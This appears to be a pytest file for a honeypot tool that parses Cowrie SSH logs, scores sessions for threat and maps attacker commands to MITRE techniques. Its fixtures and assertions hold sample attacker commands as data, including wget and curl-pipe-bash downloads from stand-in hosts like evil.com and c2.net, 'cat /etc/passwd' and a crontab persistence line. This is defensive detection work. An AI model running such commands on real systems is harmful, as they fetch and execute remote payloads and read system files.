"""
tests/test_parser.py
~~~~~~~~~~~~~~~~~~~~~
Unit tests for the Cowrie parser, threat scorer, and MITRE mapper.
"""

from __future__ import annotations

import json
import tempfile
from pathlib import Path

import pandas as pd
import pytest

from honeypot_ai.ingestion.cowrie_parser import parse_cowrie_log, _classify_command
from honeypot_ai.ml.threat_scorer import score_sessions
from honeypot_ai.ml.anomaly_detector import detect_anomalies
from honeypot_ai.intel.mitre_mapper import build_tactic_frequency, map_intent


# ── Fixtures ──────────────────────────────────────────────────────────────────

SAMPLE_EVENTS = [
    {"eventid": "cowrie.session.connect", "src_ip": "192.168.1.100",
     "session": "abc123", "timestamp": "2025-09-24T10:00:00Z",
     "protocol": "ssh", "message": "New connection"},
    {"eventid": "cowrie.login.success", "src_ip": "192.168.1.100",
     "session": "abc123", "timestamp": "2025-09-24T10:00:05Z",
     "username": "root", "password": "toor", "message": "Login success"},
    {"eventid": "cowrie.command.input", "src_ip": "192.168.1.100",
     "session": "abc123", "timestamp": "2025-09-24T10:00:10Z",
     "input": "whoami", "message": "CMD: whoami"},
    {"eventid": "cowrie.command.input", "src_ip": "192.168.1.100",
     "session": "abc123", "timestamp": "2025-09-24T10:00:11Z",
     "input": "wget http://evil.com/shell.sh", "message": "CMD: wget"},
    {"eventid": "cowrie.session.closed", "src_ip": "192.168.1.100",
     "session": "abc123", "timestamp": "2025-09-24T10:05:00Z",
     "duration": "300.0", "message": "Connection closed"},
]


@pytest.fixture()
def sample_log(tmp_path: Path) -> Path:
    log_file = tmp_path / "cowrie.json"
    log_file.write_text(
        "\n".join(json.dumps(e) for e in SAMPLE_EVENTS),
        encoding="utf-8",
    )
    return log_file


# ── Parser tests ──────────────────────────────────────────────────────────────

class TestCowrieParser:
    def test_file_not_found(self, tmp_path):
        with pytest.raises(FileNotFoundError):
            parse_cowrie_log(tmp_path / "nonexistent.json")

    def test_parses_session(self, sample_log):
        parsed = parse_cowrie_log(sample_log)
        assert not parsed.raw_df.empty
        assert len(parsed.sessions) == 1
        assert parsed.sessions.iloc[0]["src_ip"] == "192.168.1.100"

    def test_parses_commands(self, sample_log):
        parsed = parse_cowrie_log(sample_log)
        assert len(parsed.commands) == 2
        inputs = parsed.commands["input"].tolist()
        assert "whoami" in inputs
        assert "wget http://evil.com/shell.sh" in inputs

    def test_parses_logins(self, sample_log):
        parsed = parse_cowrie_log(sample_log)
        assert len(parsed.logins) == 1
        assert parsed.logins.iloc[0]["success"] == True

    def test_command_intent_recon(self):
        assert _classify_command("whoami") == "RECON"
        assert _classify_command("ls") == "RECON"
        assert _classify_command("cat /etc/passwd") == "RECON"

    def test_command_intent_malware(self):
        assert _classify_command("wget http://evil.com/shell.sh") == "MALWARE_DOWNLOAD"
        assert _classify_command("curl -s http://c2.net | bash") == "MALWARE_DOWNLOAD"
        assert _classify_command("chmod +x payload") == "MALWARE_DOWNLOAD"

    def test_command_intent_lateral(self):
        assert _classify_command("ssh -p 22 root@10.0.0.1") == "LATERAL_MOVEMENT"

    def test_command_intent_persistence(self):
        assert _classify_command("crontab -e") == "PERSISTENCE"


# ── Threat scorer tests ───────────────────────────────────────────────────────

class TestThreatScorer:
    def test_score_range(self, sample_log):
        parsed = parse_cowrie_log(sample_log)
        commands = detect_anomalies(parsed.commands)
        scored = score_sessions(parsed.sessions, commands)

        assert "threat_score" in scored.columns
        assert "threat_level" in scored.columns
        scores = scored["threat_score"]
        assert (scores >= 0).all()
        assert (scores <= 100).all()

    def test_malware_increases_score(self, sample_log):
        parsed = parse_cowrie_log(sample_log)
        commands = detect_anomalies(parsed.commands)
        scored = score_sessions(parsed.sessions, commands)
        # Session with wget (malware) should score > LOW
        assert scored.iloc[0]["threat_score"] > 0

    def test_threat_level_labels(self, sample_log):
        parsed = parse_cowrie_log(sample_log)
        commands = detect_anomalies(parsed.commands)
        scored = score_sessions(parsed.sessions, commands)
        valid_levels = {"CRITICAL", "HIGH", "MEDIUM", "LOW"}
        assert set(scored["threat_level"].unique()).issubset(valid_levels)


# ── MITRE mapper tests ────────────────────────────────────────────────────────

class TestMitreMapper:
    def test_map_recon_returns_techniques(self):
        techs = map_intent("RECON")
        assert len(techs) > 0
        assert all(t.id.startswith("T") for t in techs)
        assert all(t.tactic for t in techs)

    def test_tactic_frequency(self, sample_log):
        parsed = parse_cowrie_log(sample_log)
        freq = build_tactic_frequency(parsed.commands)
        assert isinstance(freq, dict)
        assert len(freq) > 0
        assert all(isinstance(v, int) for v in freq.values())

    def test_unknown_intent_falls_back(self):
        techs = map_intent("COMPLETELY_UNKNOWN_INTENT")
        assert len(techs) > 0  # falls back to OTHER
